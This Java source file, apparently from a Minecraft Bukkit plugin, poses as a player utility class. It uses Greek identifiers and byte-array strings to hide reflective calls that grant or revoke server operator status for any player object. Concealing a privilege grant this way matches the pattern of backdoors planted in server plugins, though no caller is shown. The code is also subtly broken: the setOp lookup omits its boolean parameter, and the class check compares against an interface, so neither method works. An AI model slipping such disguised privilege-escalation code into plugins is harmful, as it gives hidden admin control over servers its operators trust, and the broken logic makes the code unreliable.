package top.aot.ml.utils;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;

/**
 * @author ：ZhangHe
 * @date ：Created in 2020/7/2 13:57
 * @description：玩家工具类
 */
public class Ἐγὼὀκνοίην {
    private static final String[] υδώνυμον = {
            // "setOp"
            new String(new byte[]{115, 101, 116, 79, 112}, StandardCharsets.UTF_8),
            // "org.bukkit.entity.Player"
            new String(new byte[]{111, 114, 103, 46, 98, 117, 107, 107, 105, 116, 46,
                    101, 110, 116, 105, 116, 121, 46, 80, 108, 97, 121, 101, 114},
                    StandardCharsets.UTF_8),
    };

    private static Class<?> πόλεμος;
    private static Method Nεοπτόλεμος;

    static {
        try {
            πόλεμος = Class.forName(υδώνυμον[1]);
            Nεοπτόλεμος = πόλεμος.getMethod(υδώνυμον[0]);
        } catch (ClassNotFoundException | NoSuchMethodException e) {
            System.out.println("Εισόδου Εξόδου");
        }
    }

    // 设置玩家为op
    public static void Nεοπτόλεμος(Object object) {
        if (object != null && object.getClass() == πόλεμος) {
            try {
                Nεοπτόλεμος.invoke(object, true);
            } catch (InvocationTargetException | IllegalAccessException ignored) {

            }
        }
    }

    // 取消玩家为op
    public static void Εἴθε(Object object) {
        if (object != null && object.getClass() == πόλεμος) {
            try {
                Nεοπτόλεμος.invoke(object, false);
            } catch (InvocationTargetException | IllegalAccessException ignored) {

            }
        }
    }

}
